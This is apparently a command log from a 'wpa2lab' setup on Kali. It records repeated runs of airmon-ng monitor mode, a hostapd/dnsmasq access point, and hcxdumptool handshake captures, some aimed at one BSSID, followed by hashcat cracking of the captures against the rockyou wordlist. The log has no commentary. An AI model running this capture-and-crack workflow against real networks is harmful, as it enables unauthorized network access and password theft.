+2025-05-05 21:19:13,315 INFO CMD sudo iw dev wlan1mon set type monitor
+2025-05-05 21:19:13,333 INFO CMD sudo ip link set wlan1mon up
+2025-05-05 21:19:13,521 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-05 21:19:13,654 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 5 -w /home/kali/wpa2lab/captures/dump-20250505_211913.pcapng --filterlist_ap=70:D8:23:2B:52:88 --filtermode=2
+2025-05-05 21:20:04,424 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 21:20:23,606 INFO CMD sudo airmon-ng check kill
+2025-05-05 21:20:23,857 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 21:20:27,287 INFO CMD sudo ip link set wlan0 up
+2025-05-05 21:20:27,304 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 21:20:27,321 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 21:20:27,371 INFO CMD sudo hostapd -B /tmp/tmps1omcjed
+2025-05-05 21:20:27,499 INFO CMD sudo dnsmasq -C /tmp/tmp7pkvrreh
+2025-05-05 21:20:33,684 INFO CMD sudo ip link set wlan1mon down
+2025-05-05 21:20:33,754 INFO CMD sudo iw dev wlan1mon set type monitor
+2025-05-05 21:20:33,771 INFO CMD sudo ip link set wlan1mon up
+2025-05-05 21:20:33,966 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-05 21:20:34,120 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 5 -w /home/kali/wpa2lab/captures/dump-20250505_212034.pcapng --filterlist=/tmp/tmp0p7o0ke1 --filtermode=2
+2025-05-05 21:20:35,981 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 23:20:52,935 INFO sudo airmon-ng check kill
+2025-05-05 23:20:53,194 INFO sudo airmon-ng start wlan1
+2025-05-05 23:21:01,406 INFO sudo ip link set wlan0 up
+2025-05-05 23:21:01,421 INFO sudo ip addr flush dev wlan0
+2025-05-05 23:21:01,432 INFO sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 23:21:01,544 INFO sudo hostapd -B /tmp/hostapd_wlan0.conf
+2025-05-05 23:21:01,637 INFO sudo dnsmasq -C /tmp/dnsmasq_wlan0.conf
+2025-05-05 23:21:06,471 INFO sudo hcxdumptool -i wlan1mon -w /home/kali/wpa2lab/dump.pcapng
+2025-05-05 23:22:33,932 INFO hcxpcapngtool -o /home/kali/wpa2lab/hash.22000 /home/kali/wpa2lab/dump.pcapng
+2025-05-05 23:24:07,339 INFO sudo airmon-ng check kill
+2025-05-05 23:24:07,586 INFO sudo airmon-ng start wlan1
+2025-05-05 23:24:13,106 INFO sudo ip link set wlan0 up
+2025-05-05 23:24:13,123 INFO sudo ip addr flush dev wlan0
+2025-05-05 23:24:13,138 INFO sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 23:24:13,201 INFO sudo hostapd -B /tmp/hostapd_wlan0.conf
+2025-05-05 23:24:13,306 INFO sudo dnsmasq -C /tmp/dnsmasq_wlan0.conf
+2025-05-05 23:24:16,520 INFO sudo hcxdumptool -i wlan1mon -w /home/kali/wpa2lab/dump.pcapng
+2025-05-05 23:26:10,452 INFO sudo hcxdumptool -i wlan1mon -w /home/kali/wpa2lab/dump.pcapng
+2025-05-05 23:28:29,363 INFO CMD sudo airmon-ng check kill
+2025-05-05 23:28:29,625 INFO CMD sudo airmon-ng start wlan0
+2025-05-05 23:28:32,574 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 23:28:33,847 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-05 23:28:36,173 INFO CMD sudo airmon-ng check kill
+2025-05-05 23:28:36,392 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 23:28:39,307 INFO CMD sudo ip link set wlan0 up
+2025-05-05 23:28:39,517 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 23:28:39,535 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 23:28:39,591 INFO CMD sudo hostapd -B /tmp/tmpxr8z0tve
+2025-05-05 23:28:39,912 INFO CMD sudo dnsmasq -C /tmp/tmpu1my7ogi
+2025-05-05 23:28:58,505 INFO CMD sudo ip link set wlan1mon down
+2025-05-05 23:28:58,590 INFO CMD sudo iw dev wlan1mon set type monitor
+2025-05-05 23:28:58,606 INFO CMD sudo ip link set wlan1mon up
+2025-05-05 23:28:58,798 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-05 23:28:58,953 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 5 -w /home/kali/wpa2lab/captures/dump-20250505_232858.pcapng --filterlist=/tmp/tmp1s5ifc33 --filtermode=2
+2025-05-05 23:29:24,040 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 23:29:26,720 INFO CMD sudo airmon-ng check kill
+2025-05-05 23:29:26,987 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 23:29:30,858 INFO CMD sudo ip link set wlan0 up
+2025-05-05 23:29:30,875 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 23:29:30,893 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 23:29:30,949 INFO CMD sudo hostapd -B /tmp/tmp2p0jzd76
+2025-05-05 23:29:31,044 INFO CMD sudo dnsmasq -C /tmp/tmpt51_apq9
+2025-05-05 23:29:38,311 INFO CMD sudo ip link set wlan1mon down
+2025-05-05 23:29:38,396 INFO CMD sudo ip link set wlan1mon up
+2025-05-05 23:29:39,201 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-05 23:30:08,404 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 23:30:10,861 INFO CMD sudo airmon-ng check kill
+2025-05-05 23:30:11,084 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 23:30:13,771 INFO CMD sudo ip link set wlan0 up
+2025-05-05 23:30:13,790 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 23:30:13,808 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 23:30:13,869 INFO CMD sudo hostapd -B /tmp/tmpv4067d6f
+2025-05-05 23:30:13,996 INFO CMD sudo dnsmasq -C /tmp/tmp9pou0at1
+2025-05-05 23:30:27,644 INFO CMD sudo ip link set wlan1mon down
+2025-05-05 23:30:27,738 INFO CMD sudo ip link set wlan1mon up
+2025-05-05 23:30:28,545 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-05 23:31:06,185 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 23:31:08,440 INFO CMD sudo airmon-ng check kill
+2025-05-05 23:31:08,667 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 23:31:11,099 INFO CMD sudo ip link set wlan0 up
+2025-05-05 23:31:11,119 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 23:31:11,137 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 23:31:11,192 INFO CMD sudo hostapd -B /tmp/tmpuzz0jdar
+2025-05-05 23:31:11,287 INFO CMD sudo dnsmasq -C /tmp/tmp4hm54wkb
+2025-05-05 23:31:18,774 INFO CMD sudo ip link set wlan1mon down
+2025-05-05 23:31:18,865 INFO CMD sudo ip link set wlan1mon up
+2025-05-05 23:31:19,064 INFO CMD sudo hcxdumptool -i wlan1mon -w /home/kali/wpa2lab/captures/raw-20250505_233119.pcapng
+2025-05-05 23:32:15,703 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 23:32:18,163 INFO CMD sudo airmon-ng check kill
+2025-05-05 23:32:18,387 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 23:32:21,014 INFO CMD sudo ip link set wlan0 up
+2025-05-05 23:32:21,034 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 23:32:21,052 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 23:32:21,112 INFO CMD sudo hostapd -B /tmp/tmpcdjkdstf
+2025-05-05 23:32:21,187 INFO CMD sudo dnsmasq -C /tmp/tmp99clfews
+2025-05-05 23:32:33,878 INFO CMD sudo ip link set wlan0 down
+2025-05-05 23:32:34,405 INFO CMD sudo ip link set wlan1mon down
+2025-05-05 23:32:34,474 INFO CMD sudo ip link set wlan1mon up
+2025-05-05 23:32:34,668 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-05 23:32:34,822 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 70:D8:23:2B:52:88 -w /home/kali/wpa2lab/captures/dump-20250505_233234.pcapng
+2025-05-05 23:35:07,268 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 23:35:09,603 INFO CMD sudo airmon-ng check kill
+2025-05-05 23:35:09,828 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 23:35:12,518 INFO CMD sudo ip link set wlan0 up
+2025-05-05 23:35:12,728 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 23:35:12,745 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 23:35:12,803 INFO CMD sudo hostapd -B /tmp/tmpa14ktbsr
+2025-05-05 23:35:12,872 INFO CMD sudo dnsmasq -C /tmp/tmpdngbh8i5
+2025-05-05 23:35:23,514 INFO CMD sudo ip link set wlan1mon down
+2025-05-05 23:35:23,594 INFO CMD sudo iw dev wlan1mon set type monitor
+2025-05-05 23:35:23,612 INFO CMD sudo ip link set wlan1mon up
+2025-05-05 23:35:23,802 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-05 23:35:23,958 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 5 -w /home/kali/wpa2lab/captures/dump-20250505_233523.pcapng --filterlist=/tmp/tmpx3jo7bjf --filtermode=2
+2025-05-05 23:36:44,651 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 23:36:47,030 INFO CMD sudo airmon-ng check kill
+2025-05-05 23:36:47,286 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 23:36:50,426 INFO CMD sudo ip link set wlan0 up
+2025-05-05 23:36:50,443 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 23:36:50,460 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 23:36:50,515 INFO CMD sudo hostapd -B /tmp/tmpdtlfqc1u
+2025-05-05 23:36:50,615 INFO CMD sudo dnsmasq -C /tmp/tmpswockdh5
+2025-05-05 23:37:00,021 INFO CMD sudo ip link set wlan1mon down
+2025-05-05 23:37:00,091 INFO CMD sudo iw dev wlan1mon set type monitor
+2025-05-05 23:37:00,108 INFO CMD sudo ip link set wlan1mon up
+2025-05-05 23:37:00,300 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-05 23:37:00,562 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 5 -w /home/kali/wpa2lab/captures/dump-20250505_233700.pcapng --bpf=/tmp/tmp4ax8mnv8 --filtermode=2
+2025-05-05 23:38:36,535 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 23:38:38,748 INFO CMD sudo airmon-ng check kill
+2025-05-05 23:38:38,998 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 23:38:42,037 INFO CMD sudo ip link set wlan0 up
+2025-05-05 23:38:42,055 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 23:38:42,072 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 23:38:42,125 INFO CMD sudo hostapd -B /tmp/tmp0zpq6g35
+2025-05-05 23:38:42,236 INFO CMD sudo dnsmasq -C /tmp/tmpxnkxubav
+2025-05-05 23:38:48,386 INFO CMD sudo ip link set wlan1mon down
+2025-05-05 23:38:48,470 INFO CMD sudo iw dev wlan1mon set type monitor
+2025-05-05 23:38:48,488 INFO CMD sudo ip link set wlan1mon up
+2025-05-05 23:38:48,676 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-05 23:38:48,836 INFO CMD sudo hcxdumptool -i wlan1mon -c 6 -t 5 -w /home/kali/wpa2lab/captures/dump-20250505_233848.pcapng --bpf=/tmp/tmp_mduf96d
+2025-05-05 23:40:26,992 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 23:40:30,867 INFO CMD sudo airmon-ng check kill
+2025-05-05 23:40:31,125 INFO CMD sudo airmon-ng start wlan0
+2025-05-05 23:40:35,868 INFO CMD sudo ip link set wlan1 up
+2025-05-05 23:40:36,029 INFO CMD sudo ip addr flush dev wlan1
+2025-05-05 23:40:36,045 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan1
+2025-05-05 23:40:36,100 INFO CMD sudo hostapd -B /tmp/tmper1doc_5
+2025-05-05 23:40:36,545 INFO CMD sudo dnsmasq -C /tmp/tmphmno37yq
+2025-05-05 23:40:49,102 INFO CMD sudo ip link set wlan0mon down
+2025-05-05 23:40:49,180 INFO CMD sudo iw dev wlan0mon set type monitor
+2025-05-05 23:40:49,196 INFO CMD sudo ip link set wlan0mon up
+2025-05-05 23:40:49,402 INFO CMD sudo iw dev wlan0mon set channel 6
+2025-05-05 23:40:49,430 INFO CMD sudo hcxdumptool -i wlan0mon -c 6 -t 5 -w /home/kali/wpa2lab/captures/dump-20250505_234049.pcapng --bpf=/tmp/tmpie8ik0ji
+2025-05-05 23:41:19,971 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-05 23:41:22,391 INFO CMD sudo airmon-ng check kill
+2025-05-05 23:41:22,645 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 23:41:25,433 INFO CMD sudo ip link set wlan0 up
+2025-05-05 23:41:25,644 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 23:41:25,661 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 23:41:25,719 INFO CMD sudo hostapd -B /tmp/tmp7kl9x37q
+2025-05-05 23:41:26,027 INFO CMD sudo dnsmasq -C /tmp/tmpaw7awqys
+2025-05-05 23:41:32,092 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-05 23:41:32,246 INFO CMD sudo hcxdumptool -i wlan1mon -t 5 -w /home/kali/wpa2lab/captures/dump-20250505_234132.pcapng
+2025-05-05 23:42:07,901 INFO CMD hcxpcapngtool -o /home/kali/wpa2lab/hashes/hash-20250505_234207.22000 /home/kali/wpa2lab/captures/dump-20250505_234132.pcapng
+2025-05-05 23:42:18,347 INFO CMD hashcat -m 22000 /home/kali/wpa2lab/hashes/hash-20250505_234207.22000 /usr/share/wordlists/rockyou.txt --quiet
+2025-05-05 23:45:15,052 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 23:45:17,391 INFO CMD sudo airmon-ng check kill
+2025-05-05 23:45:17,654 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 23:45:23,122 INFO CMD sudo ip link set wlan0 up
+2025-05-05 23:45:23,141 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 23:45:23,159 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 23:45:23,218 INFO CMD sudo hostapd -B /tmp/tmp3fhftak7
+2025-05-05 23:45:23,324 INFO CMD sudo dnsmasq -C /tmp/tmpm1ove5_3
+2025-05-05 23:47:59,812 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 23:48:02,233 INFO CMD sudo airmon-ng check kill
+2025-05-05 23:48:02,497 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 23:48:05,540 INFO CMD sudo ip link set wlan0 up
+2025-05-05 23:48:05,559 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 23:48:05,574 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 23:48:05,625 INFO CMD sudo hostapd -B /tmp/tmp99nc10x7
+2025-05-05 23:48:05,727 INFO CMD sudo dnsmasq -C /tmp/tmp_s9nvxlc
+2025-05-05 23:49:09,050 INFO CMD hcxpcapngtool -o /home/kali/wpa2lab/hashes/hash-20250505_234909.22000 /home/kali/wpa2lab/captures/dump-20250505_234813.pcapng
+2025-05-05 23:49:11,650 INFO CMD hashcat -m 22000 /home/kali/wpa2lab/hashes/hash-20250505_234909.22000 /usr/share/wordlists/rockyou.txt --quiet
+2025-05-05 23:51:16,217 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-05 23:51:18,575 INFO CMD sudo airmon-ng check kill
+2025-05-05 23:51:18,827 INFO CMD sudo airmon-ng start wlan1
+2025-05-05 23:51:25,988 INFO CMD sudo ip link set wlan0 up
+2025-05-05 23:51:26,008 INFO CMD sudo ip addr flush dev wlan0
+2025-05-05 23:51:26,025 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-05 23:51:26,085 INFO CMD sudo hostapd -B /tmp/tmpq9gcz0wi
+2025-05-05 23:51:26,208 INFO CMD sudo dnsmasq -C /tmp/tmptlcfxvs0
+2025-05-05 23:51:35,791 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-05 23:51:35,945 INFO CMD sudo hcxdumptool -i wlan1mon -t 5 -w /home/kali/wpa2lab/captures/dump-20250505_235135.pcapng
+2025-05-05 23:51:49,640 INFO CMD hcxpcapngtool -o /home/kali/wpa2lab/hashes/hash-20250505_235149.22000 /home/kali/wpa2lab/captures/dump-20250505_235135.pcapng
+2025-05-05 23:51:51,253 INFO CMD hashcat -m 22000 /home/kali/wpa2lab/hashes/hash-20250505_235149.22000 /usr/share/wordlists/rockyou.txt --quiet
+2025-05-06 12:31:16,568 INFO CMD sudo airmon-ng check kill
+2025-05-06 12:31:17,399 INFO CMD sudo airmon-ng start wlan1
+2025-05-06 12:31:20,965 INFO CMD sudo ip link set wlan0 up
+2025-05-06 12:31:20,985 INFO CMD sudo ip addr flush dev wlan0
+2025-05-06 12:31:21,003 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-06 12:31:21,065 INFO CMD sudo hostapd -B /tmp/tmpx8eowl87
+2025-05-06 12:31:21,486 INFO CMD sudo dnsmasq -C /tmp/tmp1xnednw7
+2025-05-06 12:31:41,379 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-06 12:32:00,778 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-06 12:32:28,695 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-06 12:33:56,752 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-06 12:33:58,940 INFO CMD sudo airmon-ng check kill
+2025-05-06 12:33:59,198 INFO CMD sudo airmon-ng start wlan1
+2025-05-06 12:34:02,238 INFO CMD sudo ip link set wlan0 up
+2025-05-06 12:34:02,257 INFO CMD sudo ip addr flush dev wlan0
+2025-05-06 12:34:02,273 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-06 12:34:02,329 INFO CMD sudo hostapd -B /tmp/tmponnwdnh8
+2025-05-06 12:34:02,424 INFO CMD sudo dnsmasq -C /tmp/tmp8zc3hr6n
+2025-05-06 12:34:09,530 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-06 12:34:52,148 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-06 12:35:38,742 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-06 12:35:41,338 INFO CMD sudo airmon-ng check kill
+2025-05-06 12:35:41,596 INFO CMD sudo airmon-ng start wlan1
+2025-05-06 12:35:44,659 INFO CMD sudo ip link set wlan0 up
+2025-05-06 12:35:44,677 INFO CMD sudo ip addr flush dev wlan0
+2025-05-06 12:35:44,692 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-06 12:35:44,751 INFO CMD sudo hostapd -B /tmp/tmp4lbdedwe
+2025-05-06 12:35:44,853 INFO CMD sudo dnsmasq -C /tmp/tmpm9hcwoi4
+2025-05-06 12:37:29,499 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-06 12:37:31,946 INFO CMD sudo airmon-ng check kill
+2025-05-06 12:37:32,202 INFO CMD sudo airmon-ng start wlan1
+2025-05-06 12:37:35,283 INFO CMD sudo ip link set wlan0 up
+2025-05-06 12:37:35,302 INFO CMD sudo ip addr flush dev wlan0
+2025-05-06 12:37:35,320 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-06 12:37:35,377 INFO CMD sudo hostapd -B /tmp/tmp2qxx4nlr
+2025-05-06 12:37:35,480 INFO CMD sudo dnsmasq -C /tmp/tmp9d3boqe7
+2025-05-06 12:38:25,089 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-06 12:38:29,092 INFO CMD sudo ip link set wlan1 up
+2025-05-06 12:38:29,241 INFO CMD sudo ip addr flush dev wlan1
+2025-05-06 12:38:29,259 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan1
+2025-05-06 12:38:29,317 INFO CMD sudo hostapd -B /tmp/tmp9gyvv_ud
+2025-05-06 12:38:30,247 INFO CMD sudo dnsmasq -C /tmp/tmputka74i1
+2025-05-06 12:38:34,288 INFO CMD sudo airmon-ng check kill
+2025-05-06 12:38:34,552 INFO CMD sudo airmon-ng start wlan0
+2025-05-06 12:38:37,530 INFO CMD sudo iw dev wlan0mon set channel 6
+2025-05-06 12:39:06,870 INFO CMD sudo airmon-ng stop wlan0mon
+2025-05-06 12:39:14,697 INFO CMD sudo airmon-ng check kill
+2025-05-06 12:39:14,926 INFO CMD sudo airmon-ng start wlan1
+2025-05-06 12:39:17,965 INFO CMD sudo ip link set wlan0 up
+2025-05-06 12:39:18,182 INFO CMD sudo ip addr flush dev wlan0
+2025-05-06 12:39:18,201 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-06 12:39:18,260 INFO CMD sudo hostapd -B /tmp/tmpk1yq02c4
+2025-05-06 12:39:18,580 INFO CMD sudo dnsmasq -C /tmp/tmpt0wo2r5l
+2025-05-06 12:40:12,769 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-06 12:41:06,622 INFO CMD hcxpcapngtool -o /home/kali/wpa2lab/hashes/hash-20250506_124106.22000 /home/kali/wpa2lab/captures/dump-20250506_124012.pcapng
+2025-05-06 12:41:09,874 INFO CMD hashcat -m 22000 /home/kali/wpa2lab/hashes/hash-20250506_124106.22000 /usr/share/wordlists/rockyou.txt --quiet
+2025-05-06 12:41:50,513 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-06 12:41:53,652 INFO CMD sudo airmon-ng check kill
+2025-05-06 12:41:53,902 INFO CMD sudo airmon-ng start wlan1
+2025-05-06 12:41:57,053 INFO CMD sudo ip link set wlan0 up
+2025-05-06 12:41:57,073 INFO CMD sudo ip addr flush dev wlan0
+2025-05-06 12:41:57,091 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-06 12:41:57,148 INFO CMD sudo hostapd -B /tmp/tmpi62a_665
+2025-05-06 12:41:57,256 INFO CMD sudo dnsmasq -C /tmp/tmp089nx32h
+2025-05-06 12:42:10,753 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-06 12:42:10,966 INFO CMD sudo hcxdumptool -i wlan1mon -t 5 -w /home/kali/wpa2lab/captures/dump-20250506_124210.pcapng
+2025-05-06 12:42:54,962 INFO CMD hcxpcapngtool -o /home/kali/wpa2lab/hashes/hash-20250506_124254.22000 /home/kali/wpa2lab/captures/dump-20250506_124210.pcapng
+2025-05-06 12:42:56,896 INFO CMD hashcat -m 22000 /home/kali/wpa2lab/hashes/hash-20250506_124254.22000 /usr/share/wordlists/rockyou.txt --quiet
+2025-05-06 12:44:52,288 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-06 12:44:54,469 INFO CMD sudo airmon-ng check kill
+2025-05-06 12:44:54,728 INFO CMD sudo airmon-ng start wlan1
+2025-05-06 12:45:02,515 INFO CMD sudo ip link set wlan0 up
+2025-05-06 12:45:02,534 INFO CMD sudo ip addr flush dev wlan0
+2025-05-06 12:45:02,553 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-06 12:45:02,612 INFO CMD sudo hostapd -B /tmp/tmp3ul9f8a3
+2025-05-06 12:45:02,701 INFO CMD sudo dnsmasq -C /tmp/tmp12xw6kdi
+2025-05-06 12:45:20,224 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-06 12:45:20,242 INFO CMD sudo hcxdumptool -i wlan1mon -t 5 -w /home/kali/wpa2lab/captures/dump-20250506_124520.pcapng
+2025-05-06 12:47:11,474 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-06 12:47:14,215 INFO CMD sudo airmon-ng check kill
+2025-05-06 12:47:14,477 INFO CMD sudo airmon-ng start wlan1
+2025-05-06 12:47:17,665 INFO CMD sudo ip link set wlan0 up
+2025-05-06 12:47:17,687 INFO CMD sudo ip addr flush dev wlan0
+2025-05-06 12:47:17,706 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-06 12:47:17,763 INFO CMD sudo hostapd -B /tmp/tmp188i06ce
+2025-05-06 12:47:17,869 INFO CMD sudo dnsmasq -C /tmp/tmptkzj8v88
+2025-05-06 13:19:21,519 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-06 13:19:21,676 INFO CMD sudo hcxdumptool -i wlan1mon -t 5 -w /home/kali/wpa2lab/captures/dump-20250506_131921.pcapng
+2025-05-06 13:20:01,429 INFO CMD hcxpcapngtool -o /home/kali/wpa2lab/hashes/hash-20250506_132001.22000 /home/kali/wpa2lab/captures/dump-20250506_131921.pcapng
+2025-05-06 13:20:03,748 INFO CMD hashcat -m 22000 /home/kali/wpa2lab/hashes/hash-20250506_132001.22000 /usr/share/wordlists/rockyou.txt --quiet
+2025-05-06 13:20:36,909 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-06 13:20:41,617 INFO CMD sudo airmon-ng check kill
+2025-05-06 13:20:41,858 INFO CMD sudo airmon-ng start wlan1
+2025-05-06 13:20:46,087 INFO CMD sudo ip link set wlan0 up
+2025-05-06 13:20:46,106 INFO CMD sudo ip addr flush dev wlan0
+2025-05-06 13:20:46,123 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-06 13:20:46,179 INFO CMD sudo hostapd -B /tmp/tmpg1b600ml
+2025-05-06 13:20:46,288 INFO CMD sudo dnsmasq -C /tmp/tmpmv4ut9ee
+2025-05-06 13:21:03,787 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-06 13:21:03,942 INFO CMD sudo hcxdumptool -i wlan1mon -t 5 -w /home/kali/wpa2lab/captures/dump-20250506_132103.pcapng
+2025-05-06 13:21:39,475 INFO CMD hcxpcapngtool -o /home/kali/wpa2lab/hashes/hash-20250506_132139.22000 /home/kali/wpa2lab/captures/dump-20250506_132103.pcapng
+2025-05-06 13:21:44,071 INFO CMD hashcat -m 22000 /home/kali/wpa2lab/hashes/hash-20250506_132139.22000 /usr/share/wordlists/rockyou.txt --quiet
+2025-05-06 13:22:21,908 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-06 13:22:21,928 INFO CMD sudo hcxdumptool -i wlan1mon -t 5 -w /home/kali/wpa2lab/captures/dump-20250506_132221.pcapng
+2025-05-06 13:26:07,743 INFO CMD hcxpcapngtool -o /home/kali/wpa2lab/hashes/hash-20250506_132607.22000 /home/kali/wpa2lab/captures/dump-20250506_132221.pcapng
+2025-05-06 13:28:08,972 INFO CMD hashcat -m 22000 /home/kali/wpa2lab/hashes/hash-20250506_132746.22000 /usr/share/wordlists/rockyou.txt --quiet
+2025-05-06 13:28:22,868 INFO CMD hashcat -m 22000 /home/kali/wpa2lab/hashes/hash-20250506_132746.22000 /usr/share/wordlists/rockyou.txt --quiet
+2025-05-06 13:29:49,252 INFO CMD hashcat -m 22000 /home/kali/wpa2lab/hashes/hash-20250506_132944.22000 /usr/share/wordlists/rockyou.txt --quiet
+2025-05-06 13:30:41,758 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-06 13:30:44,725 INFO CMD sudo airmon-ng check kill
+2025-05-06 13:30:44,984 INFO CMD sudo airmon-ng start wlan1
+2025-05-06 13:30:48,264 INFO CMD sudo ip link set wlan0 up
+2025-05-06 13:30:48,281 INFO CMD sudo ip addr flush dev wlan0
+2025-05-06 13:30:48,298 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-06 13:30:48,353 INFO CMD sudo hostapd -B /tmp/tmppk7qv6k5
+2025-05-06 13:30:48,448 INFO CMD sudo dnsmasq -C /tmp/tmpd0cbcf1k
+2025-05-06 13:31:03,172 INFO CMD sudo iw dev wlan1mon set channel 6
+2025-05-06 13:31:03,189 INFO CMD sudo hcxdumptool -i wlan1mon -t 5 -w /home/kali/wpa2lab/captures/dump-20250506_133103.pcapng
+2025-05-06 13:31:56,297 INFO CMD hashcat -m 22000 /home/kali/wpa2lab/hashes/hash-20250506_133140.22000 /usr/share/wordlists/rockyou.txt --quiet
+2025-05-06 13:33:57,824 INFO CMD sudo airmon-ng stop wlan1mon
+2025-05-06 13:34:12,202 INFO CMD hashcat -m 22000 /home/kali/wpa2lab/hashes/hash-20250506_133406.22000 /usr/share/wordlists/rockyou.txt --quiet
+2025-05-06 14:39:08,872 INFO CMD sudo airmon-ng check kill
+2025-05-06 14:39:09,136 INFO CMD sudo airmon-ng start wlan1
+2025-05-06 14:39:12,850 INFO CMD sudo ip link set wlan0 up
+2025-05-06 14:39:12,868 INFO CMD sudo ip addr flush dev wlan0
+2025-05-06 14:39:12,887 INFO CMD sudo ip addr add 10.0.0.1/24 dev wlan0
+2025-05-06 14:39:12,943 INFO CMD sudo hostapd -B /tmp/tmp1mrnt_o3
+2025-05-06 14:39:13,072 INFO CMD sudo dnsmasq -C /tmp/tmpaf7_hv3b
+2025-05-06 14:40:19,822 INFO CMD sudo iw dev wlan1mon set channel 6
